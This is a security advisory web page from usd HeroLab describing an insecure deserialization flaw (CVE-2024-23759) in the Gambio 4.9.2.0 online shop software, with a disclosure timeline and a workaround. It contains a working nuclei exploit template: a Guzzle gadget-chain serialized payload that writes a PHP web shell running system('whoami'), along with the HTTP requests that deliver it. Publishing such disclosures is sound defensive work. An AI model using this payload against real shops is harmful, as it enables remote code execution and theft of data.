=== Content from herolab.usd.de_a6cd6c4d_20250114_181635.html ===

[![](https://herolab.usd.de/wp-content/uploads/sites/9/2021/07/usd-HeroLab-Logo-hell-nebeneinander.svg "usd HeroLab Logo hell nebeneinander")](https://herolab.usd.de/)

* [Über uns](https://herolab.usd.de/ueber-uns/)
  + [Wie wir arbeiten](https://herolab.usd.de/wie-wir-arbeiten/)
  + [Unsere Expert\*innen](https://herolab.usd.de/unsere-experten/)
  + [Unsere Leistungen](https://www.usd.de/security-analysis-pentests/)
  + [Unsere Plattformen und Tools](https://herolab.usd.de/unsere-plattformen-und-tools/)
* [Security Research](https://herolab.usd.de/security-research/)
  + [Unser Engagement](/security-research/#engagement)
  + [Security Advisories](https://herolab.usd.de/security-advisories/)
  + [Responsible Disclosure](https://herolab.usd.de/responsible-disclosure/)
* [LabNews](https://herolab.usd.de/labnews/)
* [Meet the Team](https://herolab.usd.de/meet-the-team/)
* [usd AG](http://www.usd.de)
* [English](https://herolab.usd.de/en/security-advisories/usd-2023-0046/ "English")

[![](https://herolab.usd.de/wp-content/uploads/sites/9/2021/07/usd-HeroLab-Logo-hell-nebeneinander.svg)](https://herolab.usd.de/)

* [Über uns](https://herolab.usd.de/ueber-uns/)
  + [Wie wir arbeiten](https://herolab.usd.de/wie-wir-arbeiten/)
  + [Unsere Expert\*innen](https://herolab.usd.de/unsere-experten/)
  + [Unsere Leistungen](https://www.usd.de/security-analysis-pentests/)
  + [Unsere Plattformen und Tools](https://herolab.usd.de/unsere-plattformen-und-tools/)
* [Security Research](https://herolab.usd.de/security-research/)
  + [Unser Engagement](/security-research/#engagement)
  + [Security Advisories](https://herolab.usd.de/security-advisories/)
  + [Responsible Disclosure](https://herolab.usd.de/responsible-disclosure/)
* [LabNews](https://herolab.usd.de/labnews/)
* [Meet the Team](https://herolab.usd.de/meet-the-team/)
* [usd AG](http://www.usd.de)
* [English](https://herolab.usd.de/en/security-advisories/usd-2023-0046/ "English")

#

# usd-2023-0046 | Gambio 4.9.2.0 - Insecure Deserialization

#

**Product**: Gambio
**Affected Version**: 4.9.2.0
**Vulnerability Type**: CWE 502 - Deserialization of Untrusted Data
**Security Risk**: Critical
**Vendor URL**: <https://www.gambio.de/>
**Vendor Status**: Fixed
**CVE Number**: CVE-2024-23759

### Description

Gambio is software designed for running online shops.
It provides various features and tools to help businesses manage their inventory, process orders, and handle customer interactions.

According to their homepage, the software is used by more than 25.000 shops.

The identified vulnerability within Gambio pertains to an insecure deserialization flaw, which ultimately allows an attacker to execute remote code on affected systems.
Deserialization is a process that restores objects from their serialized form, often used for the exchange of data between different applications or components within a software system.
However, if this process is not adequately implemented or secured, it can be exploited by malicious actors to execute arbitrary code remotely.

**Note:** Upon discovery, our team immediately initiated the responsible disclosure process by contacting the vendor behind Gambio.
Unfortunately, despite multiple attempts, our attempts to engage the vendor in resolving this issue have been met with silence.
The vulnerability is still unfixed.

The insecure deserialization vulnerability discovered in Gambio poses a significant risk to affected systems.
As it allows remote code execution, adversaries could exploit this flaw to execute arbitrary commands, potentially resulting in complete system compromise, data exfiltration, or unauthorized access to sensitive information.

### Proof of Concept

The "search" parameter of the "Parcelshopfinder/AddAddressBookEntry" function is deserialized.

The **ParcelshopfinderController.inc.php** file contains the vulnerable function in line 291:

```
$postnumber = abs(filter_var($postnumber, FILTER_SANITIZE_NUMBER_INT));
if ($postnumber == 0 || $this->isValidPostnummer($postnumber) !== true) {
    $search    = unserialize(base64_decode($this->_getPostData('search')));
    $psfParams = [
            'street'          => $search[0],
            'house'           => $search[1],
            'zip'             => $search[2],
            'city'            => $search[3],
            'country'         => $search[4],
            'firstname'       => $firstname,
            'lastname'        => $lastname,
            'postnumber'      => $postnumber,
            'additional_info' => $additional_info,
            'error'           => 'invalid_postnumber',
    ];
}
```

The serialized data must be base64 encoded, as shown in line 3 in the snippet above.
The application is using "Guzzle" which can be used as a gadget chain to receive arbitrary code execution by writing arbitrary files.

The following nuclei template was created to check for the vulnerability:

```
id: gambio-php-object-injection
info:
  name: PHP Object injection in Gambio
  description: PHP object injection in Gambio. Writes a file into the web root as a proof
  tags: gambio,php
  author: ChristianPoeschl,LukasSchraven
  severity: critical
  variables:
    gambiouser: "{{rand_base(10)}}"
    filename: "my_products.php"
    payload2: "<?php echo system('whoami');?>"
    data: 'O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:36:"{{hex_decode("00")}}GuzzleHttp\Cookie\CookieJar{{hex_decode("00")}}cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:33:"{{hex_decode("00")}}GuzzleHttp\Cookie\SetCookie{{hex_decode("00")}}data";a:9:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:{{len(payload2)}}:"{{payload2}}";s:4:"Path";s:1:"/";s:4:"Name";s:4:"test";s:6:"Domain";s:13:"test.test.com";s:6:"Secure";b:0;s:8:"Httponly";b:0;s:7:"Max-Age";i:3;}}}s:39:"{{hex_decode("00")}}GuzzleHttp\Cookie\CookieJar{{hex_decode("00")}}strictMode";N;s:41:"{{hex_decode("00")}}GuzzleHttp\Cookie\FileCookieJar{{hex_decode("00")}}filename";s:{{len(filename)}}:"{{filename}}";s:52:"{{hex_decode("00")}}GuzzleHttp\Cookie\FileCookieJar{{hex_decode("00")}}storeSessionCookies";b:1;}'
http:
  # create guest user
  - raw:
    - |
      POST /shop.php?do=CreateGuest/Proceed HTTP/1.1
      Host: {{Hostname}}
      Content-Type: application/x-www-form-urlencoded
```
```
      firstname=vvvv&lastname=vvvv&email_address={{gambiouser}}%40example.com&email_address_confirm={{gambiouser}}%40example.com&b2b_status=0&company=&vat=&street_address=asd%3C+1&postcode=11111&city=11111&country=81&telephone=%2B4912312312312&fax=&action=process
  # attack
  - raw:
    - |
      POST /shop.php?do=Parcelshopfinder/AddAddressBookEntry HTTP/1.1
      Host: {{Hostname}}
      Content-Type: application/x-www-form-urlencoded
```
```
      checkout_started=0&search={{base64(data)}}&street_address=t&house_number=1&additional_info=&postcode=1&city=t&country=DE&firstname=t&lastname=t&postnumber=111111&psf_name=t
    matchers:
      - type: dsl
        name: php-version-payload-mismatch
        dsl:
          - status_code == 500 && !contains(body, "Cannot use object of type GuzzleHttp")
      - type: dsl
        dsl:
          - status_code == 500 && contains(body, "Cannot use object of type GuzzleHttp")
```

In the first step, a new guest user is created. This can be done in an automated way, while *normal* user accounts need to solve a captcha.
The template is creating a new file "my\_products.php" containing the current username.

### Fix

It is recommended to deserialize objects only from trusted sources.

To workaround the vulnerability, Gambio users can disable the functionality the hard way and add a **die('disabled')** after line 257. Similar to the snippet below:

```
public function actionAddAddressBookEntry()    {
  die('disabled');
  if (empty($_SESSION['customer_id'])) {
    return MainFactory::create('RedirectHttpControllerResponse', xtc_href_link(FILENAME_DEFAULT, '', 'SSL'));
  }
}

```

Please pay attention that this may break some functionality, as this workaround was not tested!

**UPDATE 2024-02-14:**

In the meantime, the vendor has contacted us after the disclosure and released a new version in which the vulnerability has been fixed.

### References

* <https://www.gambio.de>

### Timeline

* **2023-12-08**: First contact request via email.
* **2023-12-21**: Second contact request via email.
* **2024-01-19**: This advisory is published.
* **2024-02-19**: Version 4.2.9.1 released.

### Credits

This security vulnerability was identified by Christian Poeschl and Lukas Schraven of usd AG.

### About usd Security Advisories

![](https://herolab.usd.de/wp-content/uploads/sites/9/2021/07/icon-hero.png "icon-hero")

In order to protect businesses against hackers and criminals, we always have to keep our skills and knowledge up to date. Thus, security research is just as important for our work as is building up a security community to promote the exchange of knowledge. After all, more security can only be achieved if many individuals take on the task.

Our [CST Academy](https://www.usd.de/en/cst-academy/) and our [usd HeroLab](https://herolab.usd.de/en/) are essential parts of our security mission. We share the knowledge we gain in our practical work and our research through training courses and publications. In this context, the [usd HeroLab](https://herolab.usd.de/en/) publishes a series of papers on new vulnerabilities and current security issues.

Always for the sake of our mission: „more security.“

[to usd AG](https://www.usd.de/)

In accordance with usd AG’s [Responsible Disclosure Policy](/en/responsible-disclosure/), all vendors have been notified of the existence of these vulnerabilities.

##

### Disclaimer

The information provided in this security advisory is provided „as is“ and without warranty of any kind. Details of this security advisory may be updated in order to provide as accurate information as possible.

#### usd HeroLab

[Kontakt](https://www.usd.de/kontakt/)
[Impressum](https://www.usd.de/impressum/)
[Datenschutz](https://www.usd.de/datenschutz/)
[AGB](https://www.usd.de/allgemeine-geschaeftsbedingungen-beratung/)

© 2023 usd AG

#### LabNews

## [From Unicode to Exploit: The Security Risks of Overlong UTF-8 Encodings](https://herolab.usd.de/the-security-risks-of-overlong-utf-8-encodings/)

Sep. 6, 2024

Written by Dominique Dittert, Senior Security Consultant, usd HeroLab In the dynamic field of cybersecurity, it is often the obscure and long-forgotten vulnerabilities that pose a hidden threat to otherwise hardened systems. One such vulnerability lies in invalid...

## [Security Advisories zu hugocms und Gitea](https://herolab.usd.de/security-advisories-zu-hugocms-und-gitea/)

Juli 25, 2024

Die Pentest Professionals des usd HeroLabs haben während der Durchführung ihrer Pentests hugocms und Gitea untersucht. Dabei wurden mehrere Schwachstellen auf den verschiedenen Anwendungen identifiziert. Die Schwachstelle wurde dem Hersteller im Rahmen der Responsible...

## [Security Advisory zu AXIS Webcam](https://herolab.usd.de/security-advisory-zu-axis-webcam/)

Juli 1, 2024

Die Pentest Professionals des usd HeroLabs haben während der Durchführung ihrer Pentests die AXIS Webcam (P1364) untersucht. Unsere Professionals entdeckten eine Sicherheitslücke (Cross-Site Request Forgery) im Adminpanel der AXIS P1364 Webcam. Das Ausnutzen dieser...

#### Folgen Sie uns

[![](https://herolab.usd.de/wp-content/uploads/sites/9/2023/10/usd-social-media-github.svg)](https://github.com/usdAG/)    [![](https://herolab.usd.de/wp-content/uploads/sites/9/2023/10/usd-social-media-reddit.svg)](https://www.reddit.com/user/usdAG/?rdt=60932)    [![](https://www.usd.de/wp-content/uploads/usd-social-media-youtube.svg)](https://www.youtube.com/c/usdAG)    [![](https://www.usd.de/wp-content/uploads/usd-social-media-mastodon.svg)](https://infosec.exchange/%40usdAG)

[![](https://www.usd.de/wp-content/uploads/usd-social-media-x.svg)](https://twitter.com/usdAG)[![](https://www.usd.de/wp-content/uploads/usd-social-media-meetup.svg)](https://www.meetup.com/de-DE/Cyber-Security-Transformation-Academy/?_locale=de-DE)    [![](https://www.usd.de/wp-content/uploads/usd-social-media-instagram.svg)](https://www.instagram.com/usdhero/)    [![](https://www.usd.de/wp-content/uploads/usd-social-media-linkedin.svg)](https://www.linkedin.com/company/usdag/?originalSubdomain=de)

[Meldung einer Schwachstelle oder eines Bugs](https://www.usd.de/meldung-bug-oder-schwachstelle/)

[Code of Ethics](/code-of-ethics/)


